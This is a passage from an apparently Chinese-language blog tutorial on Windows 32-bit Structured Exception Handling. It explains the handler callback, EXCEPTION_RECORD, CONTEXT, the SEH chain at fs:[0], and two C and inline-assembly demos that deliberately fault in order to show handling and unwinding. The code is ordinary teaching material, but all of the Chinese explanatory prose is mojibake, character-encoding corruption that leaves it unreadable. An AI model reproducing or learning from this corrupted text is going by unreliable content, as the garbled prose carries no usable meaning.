DispatcherContext);<br></code></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªå‡½æ•°å°±æ˜¯åœ¨å‘ç”Ÿå¼‚å¸¸çš„æ—¶å€™æ“ä½œç³»ç»Ÿä¼šè°ƒç”¨çš„å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå®ƒæœ‰å››ä¸ªå‚æ•°ï¼ŒæŒ‡ç¤ºäº†ä¸€äº›ä¸å¼‚å¸¸ç›¸å…³çš„ä¿¡æ¯ã€‚å¯èƒ½ä¼šæœ‰ç–‘é—®ï¼Œå³æˆ‘æ€ä¹ˆè¿™å››ä¸ªå‚æ•°çš„å€¼æ˜¯å¤šå°‘å‘¢ï¼Ÿå…¶å®åœ¨å¼‚å¸¸å‘ç”Ÿçš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šè‡ªåŠ¨æŠŠè¿™ä¸ªå››ä¸ªå‚æ•°å‹å…¥æ ˆä¸­ï¼Œä¹Ÿå› æ­¤éœ€è¦<code>__cdecl</code>æ¥å£°æ˜æ­¤å‡½æ•°çš„è°ƒç”¨çº¦å®šã€‚</p><p>å®ƒçš„è¿”å›å€¼æ˜¯æšä¸¾ç±»å‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">typedef enum _EXCEPTION_DISPOSITION<br>&#123;<br>    ExceptionContinueExecution = <span class="hljs-number">0</span>, <span class="hljs-regexp">//</span>å·²ç»å¤„ç†äº†å¼‚å¸¸ï¼Œå›åˆ°å¼‚å¸¸è§¦å‘ç‚¹ç»§ç»­æ‰§è¡Œ<br>    ExceptionContinueSearch = <span class="hljs-number">1</span>,    <span class="hljs-regexp">//</span>æ²¡æœ‰å¤„ç†å¼‚å¸¸ï¼Œç»§ç»­éå†å¼‚å¸¸é“¾è¡¨<br>    ExceptionNestedException = <span class="hljs-number">2</span>,   <span class="hljs-regexp">//</span>OSå†…éƒ¨ä½¿ç”¨<br>    ExceptionCollidedUnwind = <span class="hljs-number">3</span>     <span class="hljs-regexp">//</span>OSå†…éƒ¨ä½¿ç”¨<br>&#125;EXCEPTION_DISPOSITION;<br></code></pre></td></tr></table></figure><p>ç°åœ¨å°±æ¥çœ‹çœ‹è¿™å››ä¸ªå‚æ•°æ˜¯ä»€ä¹ˆ</p><pre><code class="hljs">     å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæŒ‡å‘**EXCEPTION_RECORD**ç»“æ„çš„æŒ‡é’ˆï¼Œå®šä¹‰å¦‚ä¸‹</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_RECORD</span> &#123;</span><br>   DWORD ExceptionCode; <span class="hljs-comment">//å¼‚å¸¸ä»£ç  æ¯”å¦‚0xc0000005</span><br>   DWORD ExceptionFlags; <span class="hljs-comment">//å¼‚å¸¸æ ‡å¿—</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_RECORD</span> *<span class="hljs-title">ExceptionRecord</span>;</span> <span class="hljs-comment">//æŒ‡å‘å¦ä¸€ä¸ªæ­¤ç»“æ„çš„æŒ‡é’ˆ</span><br>   PVOID ExceptionAddress; <span class="hljs-comment">//å¼‚å¸¸å‘ç”Ÿåœ°å€</span><br>   DWORD NumberParameters; <span class="hljs-comment">//ä¸‹é¢æ•°ç»„çš„å…ƒç´ ä¸ªæ•°</span><br>   DWORD ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS]; <span class="hljs-comment">//é™„åŠ ä¿¡æ¯</span><br>&#125; EXCEPTION_RECORD;<br></code></pre></td></tr></table></figure><p>â€‹å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæŒ‡å‘establisherå¸§ç»“æ„çš„æŒ‡é’ˆã€‚å®ƒæ˜¯SEHä¸­ä¸€ä¸ªè‡³å…³é‡è¦çš„å‚æ•°ï¼Œä½†æ˜¯ç°åœ¨å¯ä»¥å¿½ç•¥å®ƒ</p><p>â€‹å›è°ƒå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæŒ‡å‘<strong>CONTEXT</strong>ç»“æ„çš„æŒ‡é’ˆï¼Œå®šä¹‰å¦‚ä¸‹ï¼ˆè¯¥ç»“æ„å®šä¹‰éšç€Windowsç³»ç»Ÿä¸åŒä¹Ÿä¼šæ”¹å˜ã€‚æ­¤ç»“æ„ä¿å­˜å¼‚å¸¸å‘ç”Ÿæ—¶ä¸€äº›ä¸Šä¸‹æ–‡ç¯å¢ƒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CONTEXT</span></span><br><span class="hljs-class">&#123;</span><br>    DWORD ContextFlags;<br>    DWORD Dr0;<br>    DWORD Dr1;<br>    DWORD Dr2;<br>    DWORD Dr3;<br>    DWORD Dr6;<br>    DWORD Dr7;<br>    FLOATING_SAVE_AREA FloatSave;<br>    DWORD SegGs;<br>    DWORD SegFs;<br>    DWORD SegEs;<br>    DWORD SegDs;<br>    DWORD Edi;<br>    DWORD Esi;<br>    DWORD Ebx;<br>    DWORD Edx;<br>    DWORD Ecx;<br>    DWORD Eax;<br>    DWORD Ebp;<br>    DWORD Eip;<br>    DWORD SegCs;<br>    DWORD EFlags;<br>    DWORD Esp;<br>    DWORD SegSs;<br>&#125; CONTEXT;<br></code></pre></td></tr></table></figure><p>å›è°ƒå‡½æ•°çš„ç¬¬å››ä¸ªå‚æ•°è¢«ç§°ä¸ºDispatcherContextã€‚å®ƒæš‚æ—¶ä¹Ÿå¯ä»¥è¢«å¿½ç•¥ã€‚</p><p>â€‹ç°åœ¨æˆ‘ä»¬å¤§æ¦‚çŸ¥é“å›è°ƒå‡½æ•°ä¼šæœ‰å››ä¸ªå‚æ•°ï¼Œè¿™äº›å‚æ•°ä¼šç”±æ“ä½œç³»ç»Ÿè‡ªåŠ¨å‹æ ˆï¼Œå¹¶ä¸”è¿™äº›å‚æ•°è¿˜ä¼šä¸ºæˆ‘ä»¬æä¾›å¼‚å¸¸çš„é‡è¦ä¿¡æ¯ï¼Œç°åœ¨è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œæ“ä½œç³»ç»Ÿå»å“ªé‡Œæ‰¾è¿™ä¸ªå›è°ƒå‡½æ•°ï¼Ÿ</p><p>â€‹é¦–å…ˆæˆ‘ä»¬åº”è¯¥æƒ³åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå³å¼‚å¸¸å¤„ç†å‡½æ•°ä¸å¯èƒ½åªæœ‰ä¸€ä¸ªï¼Œæ¯•ç«Ÿæœ‰é‚£ä¹ˆå¤šä¸åŒçš„å¼‚å¸¸ï¼Œæ¯ä¸ªå¼‚å¸¸éƒ½éœ€è¦ä¸“é—¨çš„å‡½æ•°å»å¤„ç†ï¼Œå› æ­¤æ“ä½œç³»ç»Ÿé€‰æ‹©æŠŠè¿™äº›å¼‚å¸¸å¤„ç†å‡½æ•°ä»¥é“¾è¡¨çš„å½¢å¼å­˜å‚¨ï¼Œä¹Ÿå°±æ˜¯<strong>EXCEPTION_REGISTRATION_RECORD</strong>ç»“æ„ï¼Œæ­¤ç»“æ„å®šä¹‰å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="hljs-title">Next</span>;</span> <span class="hljs-comment">//æŒ‡å‘ä¸‹ä¸€ä¸ªç»“æ„çš„æŒ‡é’ˆ</span><br>PEXCEPTION_ROUTINE Handler; <span class="hljs-comment">//å½“å‰å¼‚å¸¸å¤„ç†å‡½æ•°çš„åœ°å€</span><br>&#125;EXCEPTION_REGISTRATION_RECORD;<br></code></pre></td></tr></table></figure><p>å› æ­¤åªè¦æ‰¾åˆ°è¿™ä¸ª<strong>EXCEPTION_REGISTRATION_RECORD</strong>ç»“æ„ï¼Œå°±å¯ä»¥æ‰¾åˆ°å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªç»“æ„åœ¨å“ªå‘¢ï¼Ÿ</p><p>â€‹è¿™å°±ä¸å¾—ä¸æåˆ°TIBï¼ˆThread Information Blockï¼Œçº¿ç¨‹ä¿¡æ¯å—ï¼‰äº†ï¼Œå®ƒä½äºTEBï¼ˆThread Environment Blockï¼Œçº¿ç¨‹ç¯å¢ƒå—ï¼‰çš„å¤´éƒ¨ã€‚TEBæ˜¯æ“ä½œç³»ç»Ÿä¸ºäº†ä¿å­˜æ¯ä¸ªçº¿ç¨‹çš„ç§æœ‰æ•°æ®è€Œåˆ›å»ºçš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„TEBã€‚ä¸åŒç³»ç»Ÿçš„TIBç»“æ„ä¹Ÿä¼šä¸åŒï¼Œä½†æˆ‘ä»¬ä¹Ÿä¸éœ€è¦å…·ä½“çŸ¥é“TIBç»“æ„ï¼Œå› ä¸º**_EXCEPTION_REGISTRATION_RECORD**ç»“æ„æ€»ä½äºTIBç»“æ„å¤´éƒ¨ã€‚è€Œåœ¨32ä½ç³»ç»Ÿä¸Šï¼Œ<code>fs:[0]</code>æ€»æ˜¯æŒ‡å‘TIBç»“æ„ã€‚</p><p>ä¸€å¥è¯è¯´æ˜ï¼Œæˆ‘ä»¬åªéœ€è¦å»<code>fs:[0]</code>å°±å¯ä»¥æ‰¾åˆ°æ­¤é“¾è¡¨äº†ã€‚</p><p>ä¸‹é¢å°±æ¥è¯•è¯•SEHå§ï¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>DWORD scratch;<br>EXCEPTION_DISPOSITION<br>__cdecl<br>_except_handler(<span class="hljs-keyword">struct</span> _EXCEPTION_RECORD* ExceptionRecord,<br>    <span class="hljs-type">void</span>* EstablisherFrame,<br>    <span class="hljs-keyword">struct</span> _CONTEXT* ContextRecord,<br>    <span class="hljs-type">void</span>* DispatcherContext)<br>&#123;<br>    <span class="hljs-type">unsigned</span> i;<br>    <span class="hljs-comment">// æŒ‡æ˜æ˜¯æˆ‘ä»¬è®©æµç¨‹è½¬åˆ°æˆ‘ä»¬çš„å¼‚å¸¸å¤„ç†ç¨‹åºçš„</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello from an exception handler\n&quot;</span>);<br>    <span class="hljs-comment">// æ”¹å˜CONTEXTç»“æ„ä¸­EAXçš„å€¼ï¼Œä»¥ä¾¿å®ƒæŒ‡å‘å¯ä»¥æˆåŠŸè¿›å†™æ“ä½œçš„ä½ç½®</span><br>    ContextRecord-&gt;Eax = (DWORD)&amp;scratch;<br>    <span class="hljs-comment">// å‘Šè¯‰æ“ä½œç³»ç»Ÿé‡æ–°æ‰§è¡Œå‡ºé”™çš„æŒ‡ä»¤</span><br>    <span class="hljs-keyword">return</span> ExceptionContinueExecution;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    DWORD handler = (DWORD)_except_handler;<span class="hljs-comment">//å½“ç„¶ä¹Ÿå¯ä»¥æŠŠè¿™ä¸ªå¼‚å¸¸å¤„ç†å‡½æ•°ä»»æ„å‘½å</span><br>    <span class="hljs-comment">//å®‰è£…æˆ‘ä»¬è‡ªå·±çš„SEH</span><br>    __asm<br>    &#123;<br>        <span class="hljs-comment">// åˆ›å»ºEXCEPTION_REGISTRATIONç»“æ„ï¼š</span><br>        <span class="hljs-comment">// æ³¨æ„å‹æ ˆé¡ºåºï¼Œè¯·ç»†ç»†ä½“ä¼šè¿™ä¸ªé“¾è¡¨çš„å½¢æˆè¿‡ç¨‹</span><br>        push handler <span class="hljs-comment">// handlerå‡½æ•°çš„åœ°å€</span><br>        push FS : [<span class="hljs-number">0</span>] <span class="hljs-comment">// å‰ä¸€ä¸ªhandlerå‡½æ•°çš„åœ°å€</span><br>        mov FS : [<span class="hljs-number">0</span>] , ESP <span class="hljs-comment">// å®‰è£…æ–°çš„EXECEPTION_REGISTRATIONç»“æ„</span><br>    &#125;<br>    __asm<br>    &#123;<br>        mov eax, <span class="hljs-number">0</span>     <span class="hljs-comment">// å°†EAXæ¸…é›¶</span><br>        mov[eax], <span class="hljs-number">1</span> <span class="hljs-comment">// å†™EAXæŒ‡å‘çš„å†…å­˜ä»è€Œæ•…æ„å¼•å‘ä¸€ä¸ªé”™è¯¯</span><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After writing!\n&quot;</span>);<br>    <br>    <span class="hljs-comment">//å¸è½½æˆ‘ä»¬è‡ªå·±çš„SEH</span><br>    __asm<br>    &#123;<br>        <span class="hljs-comment">// ç§»å»æˆ‘ä»¬çš„EXECEPTION_REGISTRATIONç»“æ„</span><br>        mov eax, [ESP]    <span class="hljs-comment">// è·å–å‰ä¸€ä¸ªç»“æ„</span><br>        mov FS : [<span class="hljs-number">0</span>] , EAX <span class="hljs-comment">// å®‰è£…å‰ä¸€ä¸ªç»“æ„</span><br>        add esp, <span class="hljs-number">8</span>       <span class="hljs-comment">// å°†æˆ‘ä»¬çš„EXECEPTION_REGISTRATIONå¼¹å‡ºå †æ ˆ</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨äº†å‡ å¥ç®€å•çš„æ±‡ç¼–è¯­è¨€ï¼Œä»¥ä¾¿å’Œä¹‹å‰æ‰€è¯´çš„å¯¹åº”ã€‚å®é™…ä¸Š<code>__try</code>æ“ä½œä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œç¼–è¯‘å™¨ä¹Ÿä¼šå¤§æ¦‚å¦‚æ­¤ç¿»è¯‘ã€‚</p><p>å†æ¬¡æ€»ç»“ä¸€ä¸‹ç›®å‰å·²ç»çŸ¥é“çš„ä¸œè¥¿ï¼šåœ¨å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šå»<code>fs:[0]</code>æ‰¾**_EXCEPTION_REGISTRATION_RECORD**ç»“æ„ï¼Œæ­¤ç»“æ„æ˜¯å¼‚å¸¸å¤„ç†å‡½æ•°çš„é“¾è¡¨ï¼Œå³<code>fs:[0]</code>å­˜æ”¾çš„æ˜¯ä¸‹ä¸€ä¸ªå¼‚å¸¸å¤„ç†å‡½æ•°ç»“æ„çš„åœ°å€ï¼Œ<code>fs:[4]</code>å­˜æ”¾çš„å°±æ˜¯å½“å‰å¼‚å¸¸å¤„ç†å‡½æ•°åœ°å€ã€‚æ­¤é“¾è¡¨ä¹Ÿå°±æ˜¯æ‰€è°“çš„SEHé“¾ï¼Œæ“ä½œéœ€è¦æ­¤SEHé“¾æ¥éå†æ‰€æœ‰å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œæ¥æ‰¾åˆ°å¯ä»¥å¤„ç†æ­¤å¼‚å¸¸çš„å‡½æ•°ã€‚</p><h2 id="åˆæ¢å±•å¼€"><a href="#åˆæ¢å±•å¼€" class="headerlink" title="åˆæ¢å±•å¼€"></a>åˆæ¢å±•å¼€</h2><p>å¦‚ä¸‹æ˜¯ç¬¬äºŒæ®µdemoï¼Œæ­¤demoä¸­æˆ‘ä»¬é€‰æ‹©ä¸å¤„ç†å¼‚å¸¸ï¼Œçœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆå§ï¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>EXCEPTION_DISPOSITION<br>__cdecl _except_handler(<br>    <span class="hljs-keyword">struct</span> _EXCEPTION_RECORD* ExceptionRecord,<br>    <span class="hljs-type">void</span>* EstablisherFrame,<br>    <span class="hljs-keyword">struct</span> _CONTEXT* ContextRecord,<br>    <span class="hljs-type">void</span>* DispatcherContext)<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Home Grown handler: Exception Code: %08X Exception Flags %X&quot;</span>,<br>        ExceptionRecord-&gt;ExceptionCode, ExceptionRecord-&gt;ExceptionFlags);<br><br>    <span class="hljs-keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags &amp; <span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; EH_NONCONTINUABLE&quot;</span>);<br>    <span class="hljs-keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags &amp; <span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; EH_UNWINDING&quot;</span>);<br>    <span class="hljs-keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags &amp; <span class="hljs-number">4</span>)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; EH_EXIT_UNWIND&quot;</span>);<br>    <span class="hljs-keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags &amp; <span class="hljs-number">8</span>) <span class="hljs-comment">// æ³¨æ„è¿™ä¸ªæ ‡å¿—</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; EH_STACK_INVALID&quot;</span>);<br>    <span class="hljs-keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags &amp; <span class="hljs-number">0x10</span>)   <span class="hljs-comment">// æ³¨æ„è¿™ä¸ªæ ‡å¿—</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; EH_NESTED_CALL&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-comment">// æˆ‘ä»¬ä¸æƒ³å¤„ç†è¿™ä¸ªå¼‚å¸¸ï¼Œè®©å…¶å®ƒå‡½æ•°å¤„ç†å§</span><br>    <span class="hljs-keyword">return</span> ExceptionContinueSearch;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">HomeGrownFrame</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    DWORD handler = (DWORD)_except_handler;<br>    __asm<br>    &#123;<br>        <span class="hljs-comment">// åˆ›å»ºEXCEPTION_REGISTRATIONç»“æ„ï¼š</span><br>        push handler       <span class="hljs-comment">// handlerå‡½æ•°çš„åœ°å€</span><br>        push FS : [<span class="hljs-number">0</span>]        <span class="hljs-comment">// å‰ä¸€ä¸ªhandlerå‡½æ•°çš„åœ°å€</span><br>        mov FS : [<span class="hljs-number">0</span>] , ESP     <span class="hljs-comment">// å®‰è£…æ–°çš„EXECEPTION_REGISTRATIONç»“æ„</span><br>    &#125;<br><br>    *(PDWORD)<span class="hljs-number">0</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// å†™å…¥åœ°å€0ï¼Œä»è€Œå¼•å‘ä¸€ä¸ªé”™è¯¯</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I should never get here!\n&quot;</span>);<br><br>    __asm<br>    &#123;<br>        <span class="hljs-comment">// ç§»å»æˆ‘ä»¬çš„EXECEPTION_REGISTRATIONç»“æ„</span><br>        mov eax, [ESP]     <span class="hljs-comment">// è·å–å‰ä¸€ä¸ªç»“æ„</span><br>        mov FS : [<span class="hljs-number">0</span>] , EAX <span class="hljs-comment">// å®‰è£…å‰ä¸€ä¸ªç»“æ„</span><br>        add esp, <span class="hljs-number">8</span>        <span class="hljs-comment">// æŠŠæˆ‘ä»¬EXECEPTION_REGISTRATIONç»“æ„å¼¹å‡ºå †æ ˆ</span><br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    __try<br>    &#123;<br>        HomeGrownFrame();<br>    &#125;<br>    __except (EXCEPTION_EXECUTE_HANDLER)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Caught the exception in main()\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤demoä¸»è¦æµç¨‹å°±æ˜¯åœ¨å‡½æ•°<code>HomeGrownFrame()</code>ä¸­å®‰è£…ä¸€ä¸ªSEHå¹¶ä¸”å¼•å‘ä¸€ä¸ªé”™è¯¯ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸å¤„ç†è¿™ä¸ªé”™è¯¯ï¼Œè€Œæ˜¯äº¤ç»™<code>main()</code>å‡½æ•°ä¸­çš„<code>__except</code>æ¥å¤„ç†ã€‚å½“å°è¯•è¿è¡Œæ—¶ï¼Œä¼šå‘ç°å¦‚ä¸‹çš„è¾“å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">Home Grown handler: Exception Code: C0000005 Exception Flags <span class="hljs-number">0</span><br>Home Grown handler: Exception Code: C0000027 Exception Flags <span class="hljs-number">2</span> EH_UNWINDING<br>Caught the Exception in <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure><p>åº”å½“ä»¤äººæƒŠè®¶çš„æ˜¯ï¼Œ<code>_except_handler</code>å‡½æ•°ä¼¼ä¹è°ƒç”¨äº†ä¸¤æ¬¡ï¼Œè€Œä¸”ç»“æœè¿˜ä¸ç›¸åŒã€‚</p><p>â€‹æ¯”è¾ƒä¸€ä¸‹ä»¥â€œHome Grown Handlerâ€å¼€å¤´çš„ä¸¤è¡Œï¼Œå°±ä¼šçœ‹å‡ºå®ƒä»¬ä¹‹é—´æœ‰æ˜æ˜¾çš„åŒºåˆ«ã€‚ç¬¬ä¸€æ¬¡å¼‚å¸¸æ ‡å¿—æ˜¯0ï¼Œè€Œç¬¬äºŒæ¬¡æ˜¯2ã€‚è¿™æŠŠæˆ‘ä»¬å¸¦å…¥åˆ°äº†å±•å¼€ï¼ˆUnwindingï¼‰çš„ä¸–ç•Œä¸­ã€‚å®é™…ä¸Šï¼Œå½“ä¸€ä¸ªå¼‚å¸¸å¤„ç†å›è°ƒå‡½æ•°æ‹’ç»å¤„ç†æŸä¸ªå¼‚å¸¸æ—¶ï¼Œå®ƒä¼šè¢«å†ä¸€æ¬¡è°ƒç”¨ã€‚ä½†æ˜¯è¿™æ¬¡å›è°ƒå¹¶ä¸æ˜¯ç«‹å³å‘ç”Ÿçš„ã€‚è¿™æœ‰ç‚¹å¤æ‚ã€‚æˆ‘éœ€è¦æŠŠå¼‚å¸¸å‘ç”Ÿæ—¶çš„æƒ…å½¢å¥½å¥½æ¢³ç†ä¸€ä¸‹ã€‚</p><p>â€‹å½“å¼‚å¸¸å‘ç”Ÿçš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿä¼šç¬¬ä¸€æ¬¡éå†**_EXCEPTION_REGISTRATION_RECORDç»“æ„é“¾è¡¨**ï¼Œç›´åˆ°æ‰¾åˆ°å¤„ç†æ­¤å¼‚å¸¸çš„å‡½æ•°ï¼Œç„¶åç¬¬äºŒæ¬¡éå†æ­¤é“¾è¡¨ç›´åˆ°å¤„ç†æ­¤å¼‚å¸¸çš„ç»“ç‚¹ï¼Œåœ¨è¿™ä¸¤æ¬¡è°ƒç”¨ä¸­ï¼Œæ“ä½œç³»ç»Ÿéƒ½ä¼šè°ƒç”¨é‡Œé¢çš„å¼‚å¸¸å¤„ç†å‡½æ•°ï¼ˆç”±äºå¼‚å¸¸å¤„ç†å‡½æ•°é€šå¸¸ä¼šè®¾ç½®ä¸€äº›è¿‡æ»¤æ“ä½œï¼Œæ‰€ä»¥å¹¶ä¸æ˜¯æ¯æ¬¡éƒ½ä¼šæ‰§è¡ŒçœŸæ­£çš„ä¿®å¤éƒ¨åˆ†ï¼‰ï¼Œå”¯ä¸€çš„åŒºåˆ«å°±æ˜¯ç¬¬äºŒæ¬¡è°ƒç”¨ä¸­å¼‚å¸¸æ ‡å¿—è¢«è®¾ç½®ä¸º2ã€‚è¿™ä¸ªå€¼è¢«å®šä¹‰ä¸ºEH_UNWINDINGã€‚</p><p>â€‹é‚£ä¸ºä»€ä¹ˆéœ€è¦è°ƒç”¨ä¸¤æ¬¡å‘¢ï¼Ÿå®é™…ä¸Šæ˜¯æ“ä½œç³»ç»Ÿç»™è¿™ä¸ªå‡½æ•°åšæœ€åçš„æ¸…ç†ï¼Œä¸€ä¸ªç»å¥½çš„ä¾‹å­æ˜¯C++ç±»çš„ææ„å‡½æ•°ã€‚å½“ä¸€ä¸ªå‡½æ•°çš„å¼‚å¸¸å¤„ç†ç¨‹åºæ‹’ç»å¤„ç†æŸä¸ªå¼‚å¸¸æ—¶ï¼Œé€šå¸¸æ‰§è¡Œæµç¨‹å¹¶ä¸ä¼šæ­£å¸¸åœ°ä»é‚£ä¸ªå‡½æ•°é€€å‡ºã€‚ç°åœ¨ï¼Œæƒ³åƒä¸€ä¸ªå®šä¹‰äº† 